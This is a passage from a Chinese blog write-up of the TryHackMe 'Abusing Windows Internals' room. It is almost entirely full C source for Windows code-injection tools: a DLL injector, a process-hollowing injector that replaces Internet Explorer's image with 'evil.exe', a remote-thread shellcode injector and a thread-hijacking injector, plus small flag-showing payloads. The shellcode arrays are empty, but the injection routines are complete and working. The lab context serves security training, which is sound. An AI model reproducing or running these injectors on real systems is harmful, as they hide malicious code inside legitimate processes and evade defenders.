+    <span class="hljs-keyword">else</span> {
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+    }
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> {
+
+    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Cannot find require parameters\n"</span>);
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Usage: dll-injector.exe &lt;process name&gt; &lt;path to DLL&gt;\n"</span>);
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
+    }
+
+    <span class="hljs-type">char</span> dllLibFullPath[<span class="hljs-number">256</span>];
+
+    LPCSTR processName = argv[<span class="hljs-number">1</span>];
+    LPCSTR dllLibName = argv[<span class="hljs-number">2</span>];
+
+    DWORD processId = getProcessId(processName);
+    <span class="hljs-keyword">if</span> (!processId) {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">if</span> (!GetFullPathName(dllLibName, <span class="hljs-keyword">sizeof</span>(dllLibFullPath), dllLibFullPath, <span class="hljs-literal">NULL</span>)) {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    LPVOID dllAllocatedMemory = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(dllLibFullPath), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    <span class="hljs-keyword">if</span> (dllAllocatedMemory == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    <span class="hljs-keyword">if</span> (!WriteProcessMemory(hProcess, dllAllocatedMemory, dllLibFullPath, <span class="hljs-built_in">strlen</span>(dllLibFullPath) + <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>)) {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    LPVOID loadLibrary = (LPVOID) GetProcAddress(GetModuleHandle(<span class="hljs-string">"kernel32.dll"</span>), <span class="hljs-string">"LoadLibraryA"</span>);
+
+    HANDLE remoteThreadHandler = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE) loadLibrary, dllAllocatedMemory, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+    <span class="hljs-keyword">if</span> (remoteThreadHandler == <span class="hljs-literal">NULL</span>) {
+        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
+    }
+
+    CloseHandle(hProcess);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<p>dllmain.cpp代码：</p>
+<pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : Defines the entry point for the DLL application.</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"pch.h"</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> EXPORTING_DLL</span>
+
+<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span>
+<span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span>
+<span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span>
+<span class="hljs-params"><span class="hljs-function">                     )</span></span>
+<span class="hljs-function"></span>{
+    <span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">"THM{}"</span>), <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">"flag"</span>), MB_OK);
+    <span class="hljs-keyword">return</span> TRUE;
+}</code></pre>
+<p>hollowing-injector.cpp代码：</p>
+<pre><code class="hljs c"><span class="hljs-comment">//hollowing-injector.cpp</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(lib, <span class="hljs-string">"ntdll.lib"</span>)</span>
+
+EXTERN_C NTSTATUS NTAPI <span class="hljs-title function_">NtUnmapViewOfSection</span><span class="hljs-params">(HANDLE, PVOID)</span>;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+
+	LPSTARTUPINFOA pVictimStartupInfo = new STARTUPINFOA();
+	LPPROCESS_INFORMATION pVictimProcessInfo = new PROCESS_INFORMATION();
+
+	<span class="hljs-comment">// Tested against 32-bit IE.</span>
+	LPCSTR victimImage = <span class="hljs-string">"C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"</span>;
+
+	<span class="hljs-comment">// Change this. Also must be 32-bit. Use project settings from the same project.</span>
+	LPCSTR replacementImage = <span class="hljs-string">"C:\\Users\\THM-Attacker\\Desktop\\Injectors\\evil.exe"</span>;
+
+	<span class="hljs-comment">// Create victim process</span>
+	<span class="hljs-keyword">if</span> (!CreateProcessA(
+			<span class="hljs-number">0</span>,
+			(LPSTR)victimImage,
+			<span class="hljs-number">0</span>,
+			<span class="hljs-number">0</span>,
+			<span class="hljs-number">0</span>,
+			CREATE_SUSPENDED,
+			<span class="hljs-number">0</span>,
+			<span class="hljs-number">0</span>,
+			pVictimStartupInfo,
+			pVictimProcessInfo)) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] Failed to create victim process %i\r\n"</span>, GetLastError());
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	};
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Created victim process\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] PID %i\r\n"</span>, pVictimProcessInfo-&gt;dwProcessId);
+
+	
+	<span class="hljs-comment">// Open replacement executable to place inside victim process</span>
+	HANDLE hReplacement = CreateFileA(
+		replacementImage,
+		GENERIC_READ,
+		FILE_SHARE_READ,
+		<span class="hljs-number">0</span>,
+		OPEN_EXISTING,
+		<span class="hljs-number">0</span>,
+		<span class="hljs-number">0</span>
+	);
+
+	<span class="hljs-keyword">if</span> (hReplacement == INVALID_HANDLE_VALUE) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] Unable to open replacement executable %i\r\n"</span>, GetLastError());
+		TerminateProcess(pVictimProcessInfo-&gt;hProcess, <span class="hljs-number">1</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+
+	DWORD replacementSize = GetFileSize(
+		hReplacement,
+		<span class="hljs-number">0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Replacement executable opened\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Size %i bytes\r\n"</span>, replacementSize);
+
+	
+	<span class="hljs-comment">// Allocate memory for replacement executable and then load it</span>
+	PVOID pReplacementImage = VirtualAlloc(
+		<span class="hljs-number">0</span>, 
+		replacementSize, 
+		MEM_COMMIT | MEM_RESERVE, 
+		PAGE_READWRITE);
+
+	DWORD totalNumberofBytesRead;
+
+	<span class="hljs-keyword">if</span> (!ReadFile(
+			hReplacement, 
+			pReplacementImage, 
+			replacementSize, 
+			&amp;totalNumberofBytesRead, 
+			<span class="hljs-number">0</span>)) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] Unable to read the replacement executable into an image in memory %i\r\n"</span>, GetLastError());
+		TerminateProcess(pVictimProcessInfo-&gt;hProcess, <span class="hljs-number">1</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	CloseHandle(hReplacement);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Read replacement executable into memory\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] In current process at 0x%08x\r\n"</span>, (UINT)pReplacementImage);
+
+	
+	<span class="hljs-comment">// Obtain context / register contents of victim process's primary thread</span>
+	CONTEXT victimContext;
+	victimContext.ContextFlags = CONTEXT_FULL;
+	GetThreadContext(pVictimProcessInfo-&gt;hThread, 
+		&amp;victimContext);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Obtained context from victim process's primary thread\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Victim PEB address / EBX = 0x%08x\r\n"</span>, (UINT)victimContext.Ebx);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Victim entry point / EAX = 0x%08x\r\n"</span>, (UINT)victimContext.Eax);
+
+	
+	<span class="hljs-comment">// Get base address of the victim executable</span>
+	PVOID pVictimImageBaseAddress;
+	ReadProcessMemory(
+		pVictimProcessInfo-&gt;hProcess, 
+		(PVOID)(victimContext.Ebx + <span class="hljs-number">8</span>), 
+		&amp;pVictimImageBaseAddress, 
+		<span class="hljs-keyword">sizeof</span>(PVOID), 
+		<span class="hljs-number">0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Extracted image base address of victim process\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Address: 0x%08x\r\n"</span>, (UINT)pVictimImageBaseAddress);
+
+	
+	<span class="hljs-comment">// Unmap executable image from victim process	</span>
+	DWORD dwResult = NtUnmapViewOfSection(
+		pVictimProcessInfo-&gt;hProcess,
+		pVictimImageBaseAddress);
+	<span class="hljs-keyword">if</span> (dwResult) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] Error unmapping section in victim process\r\n"</span>);
+		TerminateProcess(pVictimProcessInfo-&gt;hProcess, <span class="hljs-number">1</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Hollowed out victim executable via NtUnmapViewOfSection\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Utilized base address of 0x%08x\r\n"</span>, (UINT)pVictimImageBaseAddress);
+
+	
+	<span class="hljs-comment">// Allocate memory for the replacement image in the remote process</span>
+	PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pReplacementImage;
+	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pReplacementImage + pDOSHeader-&gt;e_lfanew);
+	DWORD replacementImageBaseAddress = pNTHeaders-&gt;OptionalHeader.ImageBase;
+	DWORD sizeOfReplacementImage = pNTHeaders-&gt;OptionalHeader.SizeOfImage;
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Replacement image metadata extracted\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] replacementImageBaseAddress = 0x%08x\r\n"</span>, (UINT)replacementImageBaseAddress);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Replacement process entry point = 0x%08x\r\n"</span>, (UINT)pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint);
+	
+	PVOID pVictimHollowedAllocation = VirtualAllocEx(
+		pVictimProcessInfo-&gt;hProcess,
+		(PVOID)pVictimImageBaseAddress,
+		sizeOfReplacementImage,
+		MEM_COMMIT | MEM_RESERVE,
+		PAGE_EXECUTE_READWRITE);
+	<span class="hljs-keyword">if</span> (!pVictimHollowedAllocation) {
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[-] Unable to allocate memory in victim process %i\r\n"</span>, GetLastError());
+		TerminateProcess(pVictimProcessInfo-&gt;hProcess, <span class="hljs-number">1</span>);
+		<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+	}
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Allocated memory in victim process\r\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] pVictimHollowedAllocation = 0x%08x\r\n"</span>, (UINT)pVictimHollowedAllocation);
+	
+	
+	<span class="hljs-comment">// Write replacement process headers into victim process</span>
+	WriteProcessMemory(
+		pVictimProcessInfo-&gt;hProcess, 
+		(PVOID)pVictimImageBaseAddress,
+		pReplacementImage,
+		pNTHeaders-&gt;OptionalHeader.SizeOfHeaders,
+		<span class="hljs-number">0</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Headers written into victim process\r\n"</span>);
+	
+	<span class="hljs-comment">// Write replacement process sections into victim process</span>
+	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; pNTHeaders-&gt;FileHeader.NumberOfSections; i++) {
+		PIMAGE_SECTION_HEADER pSectionHeader = 
+			(PIMAGE_SECTION_HEADER)((LPBYTE)pReplacementImage + pDOSHeader-&gt;e_lfanew + <span class="hljs-keyword">sizeof</span>(IMAGE_NT_HEADERS) 
+				+ (i * <span class="hljs-keyword">sizeof</span>(IMAGE_SECTION_HEADER)));
+		WriteProcessMemory(pVictimProcessInfo-&gt;hProcess, 
+			(PVOID)((LPBYTE)pVictimHollowedAllocation + pSectionHeader-&gt;VirtualAddress),
+			(PVOID)((LPBYTE)pReplacementImage + pSectionHeader-&gt;PointerToRawData),
+			pSectionHeader-&gt;SizeOfRawData, 
+			<span class="hljs-number">0</span>);
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Section %s written into victim process at 0x%08x\r\n"</span>, pSectionHeader-&gt;Name, (UINT)pVictimHollowedAllocation + pSectionHeader-&gt;VirtualAddress);
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t\t[*] Replacement section header virtual address: 0x%08x\r\n"</span>, (UINT)pSectionHeader-&gt;VirtualAddress);
+		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t\t[*] Replacement section header pointer to raw data: 0x%08x\r\n"</span>, (UINT)pSectionHeader-&gt;PointerToRawData);
+	}
+	
+	
+	<span class="hljs-comment">// Set victim process entry point to replacement image's entry point - change EAX</span>
+	victimContext.Eax = (SIZE_T)((LPBYTE)pVictimHollowedAllocation + pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint);
+	SetThreadContext(
+		pVictimProcessInfo-&gt;hThread, 
+		&amp;victimContext);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Victim process entry point set to replacement image entry point in EAX register\n"</span>);
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\t[*] Value is 0x%08x\r\n"</span>, (UINT)pVictimHollowedAllocation + pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint);
+
+	
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Resuming victim process primary thread...\n"</span>);
+	ResumeThread(pVictimProcessInfo-&gt;hThread);
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"[+] Cleaning up\n"</span>);
+	CloseHandle(pVictimProcessInfo-&gt;hThread);
+	CloseHandle(pVictimProcessInfo-&gt;hProcess);
+	VirtualFree(pReplacementImage, <span class="hljs-number">0</span>, MEM_RELEASE);
+
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}</code></pre>
+<p>shellcode-injector.c代码：</p>
+<pre><code class="hljs c"><span class="hljs-comment">//shellcode-injector.c</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">""</span>;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> {
+    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[<span class="hljs-number">1</span>])));
+    PVOID b_shellcode = VirtualAllocEx(h_process, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(h_process, b_shellcode, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);
+    HANDLE h_thread = CreateRemoteThread(h_process, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)b_shellcode, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+}</code></pre>
+<p>thread-injector.c代码：</p>
+<pre><code class="hljs c"><span class="hljs-comment">//thread-injector.c</span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dbghelp.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tlhelp32.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">""</span>;
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> {
+    HANDLE h_thread;
+    THREADENTRY32 threadEntry;
+    CONTEXT context;
+    context.ContextFlags = CONTEXT_FULL;
+    threadEntry.dwSize = <span class="hljs-keyword">sizeof</span>(THREADENTRY32);
+
+    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (atoi(argv[<span class="hljs-number">1</span>])));
+    PVOID b_shellcode = VirtualAllocEx(h_process, <span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span> shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(h_process, b_shellcode, shellcode, <span class="hljs-keyword">sizeof</span> shellcode, <span class="hljs-literal">NULL</span>);
+
+    HANDLE h_snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="hljs-number">0</span>);
+	Thread32First(h_snapshot, &amp;threadEntry);
+
+	<span class="hljs-keyword">while</span> (Thread32Next(h_snapshot, &amp;threadEntry))
+	{
+		<span class="hljs-keyword">if</span> (threadEntry.th32OwnerProcessID == (atoi(argv[<span class="hljs-number">1</span>])))
+		{
+			h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
+			<span class="hljs-keyword">break</span>;
+		}
+	}
+
+    SuspendThread(h_thread);
+
+    GetThreadContext(h_thread, &amp;context);
+	context.Rip = (DWORD_PTR)b_shellcode;
+	SetThreadContext(h_thread, &amp;context);
+	
+	ResumeThread(h_thread);
+
+}</code></pre>
+<p>window.cpp代码：</p>
+<pre><code class="hljs c"><span class="hljs-comment">// leetwindow.cpp : Defines the entry point for the application.</span>
+<span class="hljs-comment">//</span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+
+
+<span class="hljs-type">int</span> APIENTRY <span class="hljs-title function_">wWinMain</span><span class="hljs-params">(_In_ HINSTANCE hInstance,</span>
+<span class="hljs-params">                     _In_opt_ HINSTANCE hPrevInstance,</span>
+<span class="hljs-params">                     _In_ LPWSTR    lpCmdLine,</span>
+<span class="hljs-params">                     _In_ <span class="hljs-type">int</span>       nCmdShow)</span>
+{
+	MessageBoxA(<span class="hljs-number">0</span>, <span class="hljs-string">"THM{7h3r35_n07h1n6_h3r3}"</span>, <span class="hljs-string">"flag"</span>, <span class="hljs-number">0</span>);
+
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+</code></pre></article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/')">THM-滥用Windows内部机制</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-滥用Windows内部机制&amp;url=http://hybcx.xyz/2024/07/31/thm-lan-yong-windows-nei-bu-ji-zhi/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
+  var currentPageUrl = window.location.href;
+  var input = document.createElement("input");
+  input.setAttribute("value", currentPageUrl);
+  document.body.appendChild(input);
+  input.select();
+  input.setSelectionRange(0, 99999);
+  document.execCommand("copy");
+  document.body.removeChild(input);
+}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">36</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/25/thm-windows-api-jie-shao/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-Windows-API介绍</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/01/thm-fan-bing-du-jian-jie/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-反病毒简介</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons 